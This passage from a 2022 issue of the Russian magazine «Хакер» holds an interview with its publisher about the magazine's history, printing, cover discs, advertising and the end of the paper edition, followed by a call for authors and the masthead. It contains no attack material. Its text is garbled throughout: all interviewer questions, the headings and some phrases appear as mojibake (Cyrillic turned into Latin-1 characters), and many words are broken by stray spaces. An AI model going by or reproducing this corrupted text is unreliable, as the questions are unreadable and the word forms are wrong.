давали столь ко, сколь ко они просили. Тог да я бы, наверное, пресек такой
обмен, если бы узнал.


— Â ÷åì, ïî òâîåìó ìíåíèþ, óäà÷à «Õàêåðà» â ðàííèå âðåìåíà? Â
÷åì ïîâåçëî?
— Такого журнала, как «Хакер», не было ниг де в мире! В «Хакере» сош лась
акту аль ная кон цепция, силь ный кон тент и яркие эмоции. Такое просто не мог-
ло не сработать! Тем более экономика страны и российская ИТ-индустрия тог-
да росли бешены ми тем пами. Мы протестовали, развлекались, отры вались, я
все это поощрял.


ÁÎËÜØÎÉ «ÃÅÉÌËÅÍÄ»

— Íî â òî æå âðåìÿ ìíå âñòðåòèëàñü èñòîðèÿ ïðî ïàðíÿ ñ
íèêíåéìîì Õèíò, êîòîðûé îòâå÷àë çà âûïóñê æóðíàëà, ñîðâàë ñðîê
è áûë îøòðàôîâàí àæ íà 18 çàðïëàò è óâîëåí. Ïîìíèøü òàêîå?
— Кличку пом ню, эпизод — нет, но такие истории бывали. Про 18 зарплат,
конечно, преувеличение, но штрафы у нас были, и инициатором здесь был я.
В фин ской типог рафии не хотели работать с российскими клиентами, потому
что те часто нарушали график. Я взял на себя обязатель ство соблюдать все
сроки, и это позволило снизить цену печати. Ведь дорогостоящее оборудо-
вание не может простаивать, и гру зовики тоже ездят по графику. Я создал
культ своевремен ной сдачи, мы написали свой софт — Scanmail (Боря Сквор-
цов над ним работал), и на трид цати телевизорах по всему офису можно было
видеть, как и ког да сдается каждый журнал. По той же причине я вводил штра-
фы за любую фиг ню, включая опоздание на работу. Доллар в минуту. Это учи-
тывалось автоматически — через СКУД и бейджи. В резуль тате мы всег да сда-
вали журналы вовремя, и эти усилия оку пались. На нас мог ли положить ся
и типог рафия, и система распространения. Система работала!





      Gameland, новый офис на Автозавод ской, «Мега Плаза», 2009 год


— Æóðíàëû â êàêîé-òî ìîìåíò ñòàëè âûõîäèòü ñ äèñêàìè. Êàê âû ê
ýòîìó ïðèøëè?
— Первым журналом с диском была «Страна игр». Я эту идею под смот рел
на Западе и захотел внед рить у нас. Я попросил у Sony дать нам возможность
делать диски для журнала на их заводе. Диски для первой PlayStation были
с черной рабочей поверхностью, и такие же первые три раза прилагались
к выпускам «Страны игр». Увидев, какой мощнейший спрос добавляет наличие
диска, мы стали вкладывать диски и в «Хакер». И записы вали туда кучу всяких
прог рамм. Интернет у людей был плохой, а у кого-то и вообще не было, так что
для них это было возможностью получить доступ к новым прог раммам.


— Äèñêè òîæå ïå÷àòàëè â Ôèíëÿíäèè?
— Сначала в США, потом в Фин ляндии. Было очень удобно, что в одной стра-
не печатали и журнал, и диск и они приходили упакован ными. Но потом ввели
пош лины и НДС на ком пакт-диски. Мы стали их печатать в России и наш ли
под рядчика, который организовал упаковку. Поначалу стояли тетень ки, раскры-
вали пакеты с журналами, клали диски и запаковывали обратно. Позже мы
помог ли под рядчику приобрести и внед рить быстрое современ ное оборудо-
вание.


— Êàê â òå âðåìåíà âûãëÿäåëà ðåäàêöèÿ? Ñòàëà áîëüøå?
— Коман да всег да была неболь шой. Мне нравился вариант с фрилан сом, и я
был против внут ренних авторов. Написал — заплатили, написал еще — зап-
латили еще. Тог да было популярно вместо этого набирать всех в штат.
Не толь ко у нас, но и в США. Ког да я был на экскурсии в Wired и PC World, то
был поражен, что у них в редак ции сидит по 80 человек. У нас пять человек
делают журнал!


— Òàêîé øòàò áûë òîëüêî â «Õàêåðå»?
— Так было во всех моих журналах — костяк редак торов и внеш ние авторы.
Сейчас, наверное, ник то иначе и не делает, а тог да это было немыслимо,
это была революция. Умники с журфака пытались мне объяснить, что нужно
взять всех в штат. Я не сог лашался.


— Â 2006 ãîäó áûë ðåäèçàéí â áîëåå ñïîêîéíîì êëþ÷å. Òâîÿ
èíèöèàòèâà èëè òîãäàøíåãî ãëàâðåäà — Íèêèòû Êèñëèöèíà?
— Я тог да понял, что пора закан чивать протест и переходить в более спокой-
ный формат. Протест не может длить ся бесконечно, иначе интерес гаснет.
И мы стали двигать ся в сторону хардкорного технического издания.





                 Никита Кислицын и Степа Иль ин


— Ó âàñ áûëî ìíîãî ñòîðîííèõ ïðîåêòîâ, íàïðèìåð ýíåðãåòèê
«Õàêåð» ÷àñòî âñïîìèíàþò (êàê óæàñíóþ äðÿíü, êñòàòè).
— Слу шай, ну я роман тичный пред приниматель! Встретил что-то на Западе,
пон равилось, сказал: «А давай!». Чем боль ше движняка, тем боль ше шан сов,
что что-то получит ся. Я, кстати, брал себе этот энергетик упаковками, и мне он
дрянью не казался. Особен но нравился оригиналь ный дизайн — с прозрачной
бан кой.


— Â ðàéîíå 2006 ãîäà áûëè âñÿêèå àêòèâíîñòè, òèïà ôóòáîëà è
ñòðàéêáîëà ñ ÷èòàòåëÿìè. Òâîÿ çàòåÿ èëè êîìàíäû?
— Не пом ню — скорее, не моя. Но я всег да поощрял встречи с людь ми. Как ни
стран но,  боль шинство  главредов  избегали  встреч  с  читателями. Меня
это всег да поражало. Хотели для них писать, но слу шать и смот реть в глаза
своей аудитории не хотели.


«ÐÅÊËÀÌÍÀß ÁÎËÅÇÍÜ»

— Êàê è êóäà â èòîãå óøåë Ïîêðîâñêèé?
— О, я очень хорошо пом ню, как это было. В середине нулевых был мощный
подъем бизнеса. Денег было много, все накупили дорогих машин, и зарплаты
по 3-5, даже 10 тысяч долларов были нормой. Пок ровский очень хотел
работать с богаты ми рек ламодателями. Тог да это стало горячей темой в изда-
тель стве, посколь ку они давали сразу много денег. У кон курен тов был мега-
успешный журнал «Т3» — про гад жеты. Сергей решил, что под рек ламные кон-
трак ты хорошо будет открыть лайфстайловый журнал, связан ный с технологи-
ями. Типа американ ского Wired, но лицен зию на Wired нам не дали. Мы выб-
рали издатель ство Ziﬀ Davis, у них был похожий журнал Sync. Пок ровский убе-
дил меня дать ему полмиллиона долларов на запуск русского Sync. Сейчас я
понимаю, что поступил неправиль но. Я не верил в эту идею и день ги дал прос-
то, чтобы доказать, что она не сработает.





                       Sync за март 2006 года


— È Sync íå ñðàáîòàë?
— Нет. История вот какая. Через два месяца после запуска зак рылся аме-
рикан ский Sync. Получилось, что весь кон тент надо было делать самим. Поп-
робовали — не выш ло. Для Пок ровского это был удар по самооцен ке. Собс-
твен но, я же сам всех агитировал занимать ся бизнесом, думать о прибылях,
но в этом слу чае все пош ло не так. Пок ровский в итоге уволился. Ког да мы
с ним последний раз общались, у него было креативное агентство, они делали
вещи, типа упаковок для сока.


— Âîîáùå, ñèëüíî òîãäà çàïðîñû ðåêëàìîäàòåëåé âëèÿëè íà òî,
÷òî âû äåëàëè?
— В самом начале, в 1998 году рынок рек ламы игр как раз схлопнулся и все
день ги мы получали от читателей. Мне нравилась такая модель! В слу чае
с «Хакером» она отлично работала, потому что не нужно было ублажать никаких
рек ламодателей и подстраивать ся под их желания. Я понимал, что либо мы
пишем про взлом, либо превращаемся в рек ламную помойку. Но зараза рек-
ламы таки проник ла в Gameland. Ког да от нее зависит половина прибыли,
хочешь не хочешь, приходит ся учитывать это. И я слу шал людей, которые
говорили, что то и это нель зя писать, потому что не дадут рек ламу. Впрочем,
«Хакер» по боль шей части всего этого избежал, и я специаль но защищал его.
Если «Хакер» пишет про взлом продук та крупного вен дора и тот отзы вает рек-
ламу у всего «Геймлен да», я мог поговорить с редак цией о том, как обойти
такие ситу ации, привлекал юриста для кон суль таций и так далее. Но никог да
не запрещал писать о взломе.


— Ñî âðåìåíåì ïðèáûëü îò ðåêëàìû ñòàëà óãàñàòü?
— Вообще говоря, «Хакер» никог да не приносил ощу тимой прибыли. Имен но
поэтому, кстати, я не мог себе позволить им плот но занимать ся. В 2008 году
мы еще выходили в ноль, а вот к 2012–2013 годам рек ламы стало совсем
мало. Сказывались в том числе новые законы. В 2012 году у нас исчезло две
трети прибыли из-за запрета рек ламы сигарет и алкоголя. У нас же все жур-
налы были специализирован ные и нацелен ные на мужскую аудиторию, и без
этого нам было не выжить.


ÒÎËÜÊÎ ÖÈÔÐÀ

— Êîãäà òû áðàë ìåíÿ íà ðàáîòó â 2015 ãîäó, óæå áûëî èçâåñòíî î
òîì, ÷òî áóìàæíàÿ âåðñèÿ «Õàêåðà» âîò-âîò çàêðîåòñÿ. ×òî ê ýòîìó
ïîäòîëêíóëî?
— Я никог да не держался за «бумагу», даже в самом начале. Собствен но, я
готов был зак рывать ее, как толь ко два-три номера стали бы убы точными.
В 2014 году был кризис, потом зак рыли две трети ларь ков, и мы от этого пос-
традали боль ше всех, потому что не мог ли платить за присутствие на полках.
Нам среди «Известий» и «Ком сомоль ских правд» было просто не место. Я счи-
таю, что даже в 2008 году не имело смысла спасать «бумагу». Медиа глобаль-
но изменились, бумажные журналы стали не нужны, а потом добавились дру-
гие фак торы — новые российские законы, слабая экономика и так далее. Поди
сохрани бизнес в таких условиях!


— Íî çàêðûâàòü ñàì «Õàêåð» òû íå ïëàíèðîâàë?
— Так вопрос не стоял никог да. У меня давно были на него планы — я хотел
перек лючить его на плат ное цифровое распространение. Мне хотелось делать
кру той кон тент для растущей кру той индустрии, такой, чтобы за него платили
профи. Из всех журналов единствен ным кан дидатом был «Хакер». Ни фут бол,
ни компь ютерные игры для этого не годились.





         Первая версия Xakep.ru с плат ной под пиской, 2015 год


— Êàê ðåäàêöèÿ îòðåàãèðîâàëà íà âåñòü î çàêðûòèè «áóìàãè»?
— Редак ция этого не хотела. Думаю, боялась, что их кон тент окажет ся недос-
таточно качествен ным, чтобы его покупали. Собствен но, та редак ция почти вся
разбежалась. Я же не сом невался, что наш кон тент кру той и его будут
покупать. Поэтому последние годы я требовал поболь ше хардкора. Профес-
сиональ ные учебные материалы сейчас нужны — для работы. В отличие
от рассказов о том, как кто-то играл в игру. Парадиг ма сменилась, и обмен
впечат лениями теперь денег не стоит, а вот цен ная информация для спе-
циалистов, наоборот, стоит!
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №04 (277)

          Ан дрей Пись мен ный        Илья Русанен          Алексей Глазков
              Глав ный редак тор       Зам. главного редактора     Выпус кающий редак тор
               pismenny@glc.ru        по тех ничес ким воп росам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Ев гения Шарипова
                                     Литератур ный редактор


                         РЕДАКТОРЫ РУБРИК

          Ан дрей Пись мен ный       Ев гений Зоб нин      Ва лентин Хол могоров
               pismenny@glc.ru              zobnin@glc.ru           valentin@holmogorov.ru
             Тать яна Чуп рова            Марк           Иван «aLLy» Андре ев
                chuprova@glc.ru       Бруцкий-Стемпковский    iam@russiansecurity.expert
                                              brutsky@glc.ru


                          MEGANEWS

                           Мария Нефёдо ва
                                            nefedova@glc.ru


                                  АРТ

                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                  Анна Яков лева
                                  Директор по спец проектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                       Воп росы по подписке:     Воп росы по матери алам:
                                 lapina@glc.ru               support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство Эл № ФС77-67001 от 30.
08.2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция
не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2022